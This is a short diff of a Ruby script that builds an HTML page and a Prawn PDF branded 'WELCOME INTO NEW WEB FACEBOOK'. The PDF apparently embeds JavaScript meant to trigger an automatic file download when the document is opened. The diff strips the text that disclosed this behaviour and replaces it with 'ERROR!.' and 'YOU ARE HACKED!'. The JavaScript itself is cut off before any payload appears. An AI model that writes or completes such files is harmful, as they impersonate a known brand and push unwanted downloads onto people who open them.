@@ -23,7 +23,7 @@ def generate_html(output_file)
 </head>
 <body>
     <h1>WELCOME INTO NEW WEB FACEBOOK</h1>
-    <p>ERROR! This page is designed to automatically download a file.</p>
+    <p>ERROR!.</p>
 </body>
 </html>
 HTML
@@ -42,11 +42,11 @@ def generate_pdf(output_file)
   # Create a PDF with Prawn
   Prawn::Document.generate(output_file) do
     # Title
-    text "WELCOME INTO NEW WEB FACEBOOK", size: 16, style: :bold, align: :center
+    text "HACKED", size: 16, style: :bold, align: :center
 
     # Description
     move_down 20
-    text "This PDF contains a hidden feature that will attempt to automatically download a file when opened."
+    text "YOU ARE HACKED!"
 
     # Embed JavaScript (attempt to trigger download in supported PDF viewers)
     js_code = <<-JS
